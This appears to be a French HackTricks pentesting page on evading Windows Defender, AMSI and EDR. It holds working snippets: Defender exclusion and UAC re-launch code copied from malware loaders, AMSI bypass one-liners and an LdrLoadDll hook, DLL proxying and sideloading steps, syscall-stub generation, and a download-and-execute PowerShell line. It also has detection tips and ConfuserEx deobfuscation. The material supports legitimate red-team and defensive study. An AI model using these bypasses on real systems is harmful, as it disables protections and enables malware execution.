# Contournement de l’antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Cette page a été initialement écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot) : un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender) : un outil qui empêche Windows Defender de fonctionner en simulant un autre AV.
- [Désactiver Defender si vous êtes administrateur](basic-powershell-for-pentesters/README.md)

### Leurre UAC de type installateur avant de s’en prendre à Defender

Les loaders publics se faisant passer pour des cheats de jeu sont souvent distribués sous forme d’installateurs Node.js/Nexe non signés, qui **demandent d’abord à l’utilisateur d’élever ses privilèges**, puis neutralisent Defender. Le processus est simple :

1. Vérifier si l’exécution se fait avec des privilèges administrateur à l’aide de `net session`. La commande ne réussit que si l’appelant dispose de droits administrateur ; un échec indique donc que le loader s’exécute en tant qu’utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` afin de déclencher la demande de consentement UAC attendue, tout en conservant la ligne de commande d’origine.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Les victimes pensent déjà installer un logiciel « cracké », elles acceptent donc généralement l’invite, accordant ainsi au malware les droits nécessaires pour modifier la stratégie de Defender.<sup>[[26]](#references)</sup>

### Exclusions `MpPreference` globales pour chaque lettre de lecteur

Une fois les privilèges élevés obtenus, les chaînes de type GachiLoader maximisent les angles morts de Defender au lieu de désactiver complètement le service. Le loader tue d’abord le watchdog de l’interface graphique (`taskkill /F /IM SecHealthUI.exe`), puis ajoute des **exclusions extrêmement larges** afin que chaque profil utilisateur, répertoire système et disque amovible échappe à l’analyse :

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Observations clés :

- La boucle parcourt chaque système de fichiers monté (D:\, E:\, clés USB, etc.) ; **tout payload ajouté ultérieurement n’importe où sur le disque est donc ignoré**.
- L’exclusion de l’extension `.sys` est préventive : les attaquants se réservent la possibilité de charger ultérieurement des pilotes non signés sans avoir à modifier à nouveau Defender.
- Toutes les modifications sont enregistrées sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ce qui permet aux étapes suivantes de confirmer que les exclusions persistent ou de les étendre sans déclencher à nouveau l’UAC.

Comme aucun service Defender n’est arrêté, les contrôles de santé naïfs continuent d’indiquer que « l’antivirus est actif », même si l’inspection en temps réel ne surveille jamais ces chemins.<sup>[[26]](#references)</sup>

## **Méthodologie d’évasion des AV**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : la détection statique, l’analyse dynamique et, pour les EDR les plus avancés, l’analyse comportementale.

### **Détection statique**

La détection statique consiste à signaler les chaînes malveillantes connues ou les séquences d’octets présentes dans un binaire ou un script, ainsi qu’à extraire des informations du fichier lui-même (par exemple, sa description, le nom de l’entreprise, ses signatures numériques, son icône, son checksum, etc.). Cela signifie que l’utilisation d’outils publics connus risque de vous faire détecter plus facilement, car ils ont probablement déjà été analysés et signalés comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Chiffrement**

Si vous chiffrez le binaire, l’AV ne pourra pas détecter votre programme, mais vous aurez besoin d’un loader pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier certaines chaînes de votre binaire ou de votre script pour qu’il échappe à l’AV, mais cela peut prendre du temps selon ce que vous essayez d’obfusquer.

- **Outils personnalisés**

Si vous développez vos propres outils, ils n’auront pas de signatures malveillantes connues, mais cela demande beaucoup de temps et d’efforts.

> [!TIP]
> Pour vérifier la détection statique de Windows Defender, [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) est un bon outil. Il divise le fichier en plusieurs segments, puis demande à Defender d’analyser chacun d’eux individuellement. Il peut ainsi vous indiquer précisément quelles chaînes ou quels octets de votre binaire sont signalés.

Je vous recommande vivement de consulter cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) consacrée à l’évasion des AV en pratique.

### **Analyse dynamique**

L’analyse dynamique consiste à exécuter votre binaire dans un sandbox et à surveiller toute activité malveillante (par exemple, tenter de déchiffrer et de lire les mots de passe de votre navigateur, effectuer un minidump de LSASS, etc.). Cette partie peut être un peu plus délicate, mais voici quelques moyens d’échapper aux sandboxes.

- **Attendre avant l’exécution** Selon la manière dont elle est implémentée, cette technique peut être très efficace pour contourner l’analyse dynamique des AV. Les AV disposent de très peu de temps pour analyser les fichiers sans interrompre le travail de l’utilisateur ; de longues attentes peuvent donc perturber l’analyse des binaires. Le problème, c’est que de nombreux sandboxes d’AV peuvent simplement ignorer l’attente, selon la manière dont elle est implémentée.
- **Vérifier les ressources de la machine** Les sandboxes disposent généralement de très peu de ressources (par exemple, < 2GB RAM), sans quoi elles pourraient ralentir la machine de l’utilisateur. Vous pouvez aussi faire preuve de créativité, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs : tous ces éléments ne seront pas simulés dans le sandbox.
- **Vérifications propres à la machine** Si vous voulez cibler un utilisateur dont le poste de travail est joint au domaine « contoso.local », vous pouvez vérifier le domaine de l’ordinateur et voir s’il correspond à celui que vous avez spécifié. Si ce n’est pas le cas, vous pouvez faire quitter votre programme.

Il s’avère que le nom de l’ordinateur du sandbox de Microsoft Defender est HAL9TH. Vous pouvez donc vérifier le nom de l’ordinateur dans votre malware avant son déclenchement : s’il correspond à HAL9TH, cela signifie que vous êtes dans le sandbox de Defender, et vous pouvez alors faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source : <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Voici d’autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour échapper aux sandboxes.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l’avons déjà dit dans cet article, les **outils publics** finiront par **être détectés**. Vous devriez donc vous poser la question suivante :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d’utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet moins connu qui permet également de dumper LSASS ?

La deuxième option est probablement la bonne. Prenons mimikatz : c’est probablement l’un des malwares les plus signalés par les AV et les EDR, si ce n’est le plus signalé. Le projet en lui-même est très intéressant, mais il est aussi extrêmement difficile à utiliser pour contourner les AV. Cherchez donc simplement des solutions de remplacement pour atteindre votre objectif.

> [!TIP]
> Lorsque vous modifiez vos payloads pour échapper à la détection, veillez à **désactiver l’envoi automatique des échantillons** dans Defender et, sérieusement, **NE TÉLÉVERSEZ PAS SUR VIRUSTOTAL** si votre objectif est de rester indétectable à long terme. Si vous voulez vérifier si un AV donné détecte votre payload, installez-le sur une VM, essayez de désactiver l’envoi automatique des échantillons et testez-le jusqu’à obtenir le résultat souhaité.

## EXEs vs DLLs

Dans la mesure du possible, **privilégiez toujours les DLL pour l’évasion**. D’après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés et analysés**. C’est donc une astuce très simple pour éviter la détection dans certains cas (si votre payload peut bien sûr être exécuté en tant que DLL).

Comme le montre cette image, un payload DLL de Havoc obtient un taux de détection de 4/26 sur antiscan.me, tandis que le payload EXE obtient un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparaison sur antiscan.me d’un payload EXE Havoc standard et d’une DLL Havoc standard</p></figcaption></figure>

Nous allons maintenant présenter quelques astuces à utiliser avec les fichiers DLL pour être beaucoup plus furtif.

## DLL Sideloading & Proxying

Le **DLL Sideloading** exploite l’ordre de recherche des DLL utilisé par le loader en plaçant côte à côte l’application victime et le ou les payloads malveillants.

Vous pouvez rechercher les programmes vulnérables au DLL Sideloading avec [Siofra](https://github.com/Cybereason/siofra) et le script PowerShell suivant :

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Cette commande affiche la liste des programmes susceptibles au DLL hijacking dans « C:\Program Files\\ » et des fichiers DLL qu’ils tentent de charger.

Je vous recommande vivement d’**explorer vous-même les programmes vulnérables au DLL Hijacking/Sideloading**. Cette technique est assez furtive lorsqu’elle est bien exécutée, mais si vous utilisez des programmes connus publiquement comme étant vulnérables au DLL Sideloading, vous risquez facilement de vous faire repérer.

Le simple fait de placer une DLL malveillante portant le nom d’une DLL que le programme s’attend à charger ne suffira pas à charger votre payload, car le programme s’attend à trouver certaines fonctions spécifiques dans cette DLL. Pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

Le **DLL Proxying** redirige vers la DLL d’origine les appels qu’un programme effectue via la DLL proxy (malveillante). Cela permet de préserver les fonctionnalités du programme tout en exécutant votre payload.

J’utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes suivies :

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

La dernière commande nous fournira 2 fichiers : un modèle de code source DLL et la DLL d'origine renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Voici les résultats :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et la proxy DLL ont tous deux un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! J’appellerais ça une réussite.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous **recommande vivement** de regarder le [VOD Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading, ainsi que la [vidéo d’ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), pour approfondir ce dont nous avons parlé.

### Abus des exports transférés (ForwardSideLoading)

Les modules PE Windows peuvent exporter des fonctions qui sont en réalité des « forwarders » : au lieu de pointer vers du code, l’entrée d’export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu’un appelant résout cet export, le chargeur Windows va :

- Charger `TargetDll` s’il ne l’est pas déjà
- Résoudre `TargetFunc` à partir de ce module

Comportements clés à comprendre :
- Si `TargetDll` est une KnownDLL, elle est fournie depuis l’espace de noms protégé KnownDLLs (par exemple, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Si `TargetDll` n’est pas une KnownDLL, l’ordre de recherche normal des DLL est utilisé, y compris le répertoire du module qui effectue la résolution du forward.

Cela permet une primitive indirecte de sideloading : trouver une DLL signée qui exporte une fonction transférée vers un module dont le nom n’est pas une KnownDLL, puis placer cette DLL signée à côté d’une DLL contrôlée par l’attaquant et nommée exactement comme le module cible du transfert. Lorsque l’export transféré est invoqué, le chargeur résout le forward et charge votre DLL depuis le même répertoire, exécutant ainsi votre DllMain.<sup>[[13]](#references)</sup>

Exemple observé sous Windows 11 :

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` n’est pas une KnownDLL ; elle est donc résolue selon l’ordre de recherche normal.

PoC (copier-coller) :
1) Copiez la DLL système signée dans un dossier accessible en écriture.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez un `NCRYPTPROV.dll` malveillant dans le même dossier. Un `DllMain` minimal suffit pour exécuter du code ; vous n’avez pas besoin d’implémenter la fonction transférée pour déclencher `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Déclencher le transfert avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportement observé :
- rundll32 (signé) charge le `keyiso.dll` side-by-side (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n’est pas implémentée, vous obtiendrez une erreur « missing API » seulement après l’exécution de `DllMain`

Conseils de recherche :
- Concentrez-vous sur les exports forwardés dont le module cible n’est pas un KnownDLL. Les KnownDLLs sont répertoriées sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés à l’aide d’outils tels que :
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l’inventaire des forwarders de Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idées de détection/défense :
- Surveillez les LOLBins (p. ex., rundll32.exe) qui chargent des DLL signées depuis des chemins non système, puis chargent depuis ce répertoire des DLL qui ne sont pas des KnownDLLs et portent le même nom de base
- Déclenchez une alerte sur les chaînes de processus/modules telles que : `rundll32.exe` → `keyiso.dll` non système → `NCRYPTPROV.dll` dans des chemins accessibles en écriture par l’utilisateur
- Appliquez des politiques d’intégrité du code (WDAC/AppLocker) et interdisez les droits d’écriture et d’exécution dans les répertoires d’application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze est un kit d’outils de payload permettant de contourner les EDR à l’aide de processus suspendus, d’appels système directs et de méthodes d’exécution alternatives`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L’évasion est un jeu du chat et de la souris : ce qui fonctionne aujourd’hui peut être détecté demain. Ne vous fiez donc jamais à un seul outil ; si possible, essayez d’enchaîner plusieurs techniques d’évasion.

## Syscalls directs/indirects et résolution des SSN (SysWhispers4)

Les EDR placent souvent des **hooks inline en mode utilisateur** sur les stubs de syscall de `ntdll.dll`. Pour contourner ces hooks, vous pouvez générer des stubs de syscall **directs** ou **indirects** qui chargent le **SSN** (System Service Number) correct et passent en mode noyau sans exécuter le point d’entrée exporté intercepté.<sup>[[32]](#references)</sup>

**Options d’invocation :**
- **Direct (intégré)** : émettre une instruction `syscall`/`sysenter`/`SVC #0` dans le stub généré (aucun appel à un export de `ntdll`).
- **Indirect** : sauter vers un gadget `syscall` existant dans `ntdll` afin que la transition vers le noyau semble provenir de `ntdll` (utile pour contourner les détections heuristiques) ; **randomized indirect** sélectionne un gadget dans un pool à chaque appel.
- **Egg-hunt** : éviter d’intégrer la séquence d’opcodes statique `0F 05` sur le disque ; résoudre une séquence de syscall à l’exécution.

**Stratégies de résolution des SSN résistantes aux hooks :**
- **FreshyCalls (tri par VA)** : déduire les SSN en triant les stubs de syscall par adresse virtuelle plutôt qu’en lisant les octets des stubs.
- **SyscallsFromDisk** : mapper un `\KnownDlls\ntdll.dll` propre, lire les SSN dans son `.text`, puis le démonter (contourne tous les hooks en mémoire).
- **RecycledGate** : combiner la déduction des SSN par tri des VA avec la validation des opcodes lorsque le stub est propre ; revenir à la déduction par VA s’il est intercepté.
- **HW Breakpoint** : placer DR0 sur l’instruction `syscall` et utiliser un VEH pour capturer le SSN depuis `EAX` à l’exécution, sans analyser les octets interceptés.

Exemple d’utilisation de SysWhispers4 :
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher les « [malwares fileless](https://en.wikipedia.org/wiki/Fileless_malware) ». Au départ, les antivirus ne pouvaient analyser que les **fichiers sur le disque**. Ainsi, si vous parveniez à exécuter des payloads **directement en mémoire**, l’antivirus ne pouvait rien faire pour l’empêcher, car il n’avait pas une visibilité suffisante.

La fonctionnalité AMSI est intégrée aux composants Windows suivants.

- Contrôle de compte d’utilisateur, ou UAC (élévation d’EXE, de COM, de MSI ou installation d’ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation dynamique de code)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- Macros VBA d’Office

Elle permet aux solutions antivirus d’inspecter le comportement des scripts en exposant leur contenu sous une forme non chiffrée et non obfusquée.

L’exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` déclenchera l’alerte suivante dans Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notez qu’il ajoute `amsi:` suivi du chemin vers l’exécutable qui a lancé le script, dans ce cas, powershell.exe

Nous n’avons déposé aucun fichier sur le disque, mais nous avons tout de même été détectés en mémoire grâce à AMSI.

De plus, depuis **.NET 4.8**, le code C# est également analysé par AMSI. Cela concerne même `Assembly.Load(byte[])`, qui permet de charger du code pour l’exécuter en mémoire. C’est pourquoi il est recommandé d’utiliser des versions antérieures de .NET (comme la version 4.7.2 ou précédente) pour l’exécution en mémoire si vous souhaitez contourner AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

AMSI reposant principalement sur des détections statiques, modifier les scripts que vous essayez de charger peut être un bon moyen d’échapper à la détection.

Cependant, AMSI est capable de désobfusquer les scripts, même s’ils comportent plusieurs couches d’obfuscation. Selon la méthode utilisée, l’obfuscation peut donc être une mauvaise option. Il n’est ainsi pas toujours simple d’échapper à la détection. Parfois, il suffit toutefois de changer quelques noms de variables ; cela dépend donc du degré de détection d’un élément.

- **AMSI Bypass**

AMSI étant implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est facile de la manipuler, même avec un utilisateur non privilégié. En raison de cette faille dans l’implémentation d’AMSI, des chercheurs ont découvert plusieurs moyens d’échapper à l’analyse AMSI.

**Provoquer une erreur**

Forcer l’échec de l’initialisation d’AMSI (amsiInitFailed) empêchera toute analyse pour le processus en cours. Cette méthode a été divulguée à l’origine par [Matt Graeber](https://twitter.com/mattifestation), et Microsoft a développé une signature pour empêcher son utilisation à grande échelle.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Il n’a fallu qu’une seule ligne de code PowerShell pour rendre AMSI inutilisable dans le processus PowerShell en cours. Cette ligne a bien sûr été détectée par AMSI lui-même ; il faut donc la modifier pour utiliser cette technique.

Voici un contournement d’AMSI modifié que j’ai repris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Gardez à l’esprit que cet article sera probablement signalé une fois publié. Vous ne devriez donc publier aucun code si votre objectif est de ne pas être détecté.

**Memory Patching**

Cette technique a été découverte à l’origine par [@RastaMouse](https://twitter.com/_RastaMouse/). Elle consiste à trouver l’adresse de la fonction « AmsiScanBuffer » dans amsi.dll (qui analyse les entrées fournies par l’utilisateur), puis à la remplacer par des instructions qui renvoient le code E_INVALIDARG. Ainsi, le résultat de l’analyse réelle renvoie 0, ce qui est interprété comme un résultat propre.

> [!TIP]
> Pour une explication plus détaillée, consultez [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

De nombreuses autres techniques permettent également de bypasser AMSI avec powershell. Consultez [**cette page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**ce dépôt**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus.

### Bloquer AMSI en empêchant le chargement de amsi.dll (hook LdrLoadDll)

AMSI n’est initialisé qu’après le chargement de `amsi.dll` dans le processus courant. Un bypass robuste et indépendant du langage consiste à installer un hook en mode utilisateur sur `ntdll!LdrLoadDll`, qui renvoie une erreur lorsque le module demandé est `amsi.dll`. Ainsi, AMSI ne se charge jamais et aucune analyse n’a lieu pour ce processus.<sup>[[23]](#references)</sup>

Schéma de mise en œuvre (pseudocode x64 C/C++) :
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Remarques
- Fonctionne avec PowerShell, WScript/CScript et les loaders personnalisés (tout ce qui chargerait autrement AMSI).
- À associer à l’envoi des scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts de ligne de commande trop longs.
- A été utilisé avec des loaders exécutés via des LOLBins (par ex. `regsvr32` appelant `DllRegisterServer`).

L’outil **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** génère également des scripts pour contourner AMSI.
L’outil **[https://amsibypass.com/](https://amsibypass.com/)** génère également des scripts pour contourner AMSI et éviter les signatures grâce à des fonctions définies par l’utilisateur, des variables et des expressions de caractères aléatoires, ainsi qu’à une casse aléatoire des caractères des mots-clés PowerShell.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ou **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus actuel. Cet outil analyse la mémoire du processus actuel à la recherche de la signature AMSI, puis la remplace par des instructions NOP, ce qui la supprime effectivement de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous trouverez une liste des produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser PowerShell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé ; vous pourrez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Voici comment faire :

```bash
powershell.exe -version 2
```

## Journalisation PowerShell

La journalisation PowerShell est une fonctionnalité qui permet d’enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile à des fins d’audit et de dépannage, mais aussi poser un **problème aux attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Désactiver la transcription PowerShell et la journalisation des modules** : vous pouvez utiliser un outil comme [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Utiliser PowerShell version 2** : si vous utilisez PowerShell version 2, AMSI ne sera pas chargé ; vous pourrez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Pour cela, utilisez : `powershell.exe -version 2`
- **Utiliser une session PowerShell non managée** : utilisez [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour héberger PowerShell sans lancer `powershell.exe` (l’approche utilisée par le `powerpick` de Cobalt Strike). Cela permet d’échapper aux contrôles spécifiquement liés au processus `powershell.exe`, mais ne désactive pas intrinsèquement AMSI, Script Block Logging ni toutes les autres protections PowerShell ; la couverture dépend du runtime et de l’implémentation de l’hôte.


## Obfuscation

> [!TIP]
> Plusieurs techniques d’obfuscation reposent sur le chiffrement des données, ce qui augmente l’entropie du binaire et facilite sa détection par les AV et les EDR. Soyez prudent et n’appliquez éventuellement le chiffrement qu’à certaines parties sensibles de votre code ou qui doivent être masquées.

### Déobfuscation de binaires .NET protégés par ConfuserEx

Lors de l’analyse de malware utilisant ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandbox. Le workflow ci-dessous **restaure de manière fiable un IL presque original**, qui peut ensuite être décompilé en C# avec des outils tels que dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1.  Suppression de la protection anti-altération – ConfuserEx chiffre chaque *corps de méthode* et le déchiffre dans le constructeur statique du *module* (`<Module>.cctor`). Il modifie également la somme de contrôle PE, de sorte que toute modification fera planter le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   La sortie contient les 6 paramètres anti-altération (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles pour créer votre propre unpacker.

2.  Récupération des symboles / du flux de contrôle – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot adapté à ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Drapeaux :
     • `-p crx` – sélectionner le profil ConfuserEx 2
     • de4dot annule le control-flow flattening, restaure les namespaces, les classes et les noms de variables d’origine, et déchiffre les chaînes constantes.

3.  Proxy-call stripping – ConfuserEx remplace les appels directs aux méthodes par de légères enveloppes (également appelées *proxy calls*) pour compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Après cette étape, vous devriez voir des API .NET classiques comme `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire obtenu dans dnSpy, recherchez de grands blobs Base64 ou l’utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le *vrai* payload. Souvent, le malware le stocke sous forme de tableau d’octets encodé en TLV, initialisé dans `<Module>.byte_0`.

Cette chaîne rétablit le flux d’exécution **sans** avoir à exécuter l’échantillon malveillant – pratique sur un poste de travail hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute` qui peut servir d’IOC pour trier automatiquement les échantillons.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)** : obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator) : l’objectif de ce projet est de fournir un fork open source de la suite de compilation [LLVM](http://www.llvm.org/) capable d’améliorer la sécurité logicielle grâce à l’[obfuscation de code](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et à la protection contre les altérations.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator) : ADVobfuscator montre comment utiliser le langage `C++11/14` pour générer, à la compilation, du code obfusqué sans outil externe et sans modifier le compilateur.
